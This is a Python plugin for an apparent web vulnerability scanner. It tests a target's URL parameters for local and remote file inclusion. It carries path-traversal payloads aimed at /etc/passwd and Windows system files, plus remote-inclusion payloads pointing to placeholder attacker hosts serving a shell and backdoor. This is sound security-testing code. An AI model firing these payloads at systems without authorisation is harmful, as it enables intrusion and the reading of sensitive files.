def scan(scanner):
    """Scan for Local File Inclusion (LFI) and Remote File Inclusion (RFI)"""
    print("[PLUGIN] Scanning for LFI/RFI vulnerabilities...")
    lfi_payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd'
    ]
    rfi_payloads = [
        'http://evil.com/shell.txt',
        'https://attacker.com/backdoor.php'
    ]
    vulnerable_params = ['file', 'page', 'include', 'path', 'doc', 'dir', 'filename']
    try:
        from urllib.parse import urlparse
        parsed_url = urlparse(scanner.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        for param in vulnerable_params:
            for payload in lfi_payloads + rfi_payloads:
                test_url = f"{scanner.target_url}?{param}={payload}"
                try:
                    response = scanner.session.get(test_url, timeout=scanner.timeout)
                    if 'root:x:' in response.text or 'bin:x:' in response.text:
                        scanner.log_vulnerability(
                            'Local File Inclusion (LFI)',
                            'Critical',
                            f'LFI vulnerability detected in parameter {param}',
                            f'Payload: {payload}',
                            'CWE-73'
                        )
                        break
                    if 'evil.com' in response.text or 'attacker.com' in response.text:
                        scanner.log_vulnerability(
                            'Remote File Inclusion (RFI)',
                            'Critical',
                            f'RFI vulnerability detected in parameter {param}',
                            f'Payload: {payload}',
                            'CWE-98'
                        )
                        break
                except Exception as e:
                    continue
    except Exception as e:
        print(f"[PLUGIN][LFI/RFI] Error: {e}") 